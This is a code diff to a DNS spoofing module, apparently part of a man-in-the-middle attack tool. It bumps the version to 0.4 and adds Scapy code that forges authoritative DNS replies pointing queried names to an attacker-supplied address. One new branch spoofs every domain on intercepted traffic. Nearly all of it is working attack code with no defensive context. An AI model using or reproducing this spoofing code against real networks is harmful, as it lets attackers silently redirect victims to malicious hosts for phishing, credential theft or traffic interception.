@@ -29,7 +29,7 @@ class DNSspoof(object):
 
 	name = "DNS spoofing"
 	desc = "Filter DNS packets while in man-in-the-middle and modify packet."
-	version = "0.3"
+	version = "0.4"
 
 	def __init__(self,fake):
 		self.fake = fake
@@ -44,6 +44,14 @@ class DNSspoof(object):
 		else:
 			if self.inject != None:
 				new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+                                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+                                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
+                                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.fake))
+                                packet.set_payload(str(new_pkt))
+                                packet.accept()
+
+			elif self.domain == "all":
+                                new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                                               UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                                               DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                                               an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.fake))
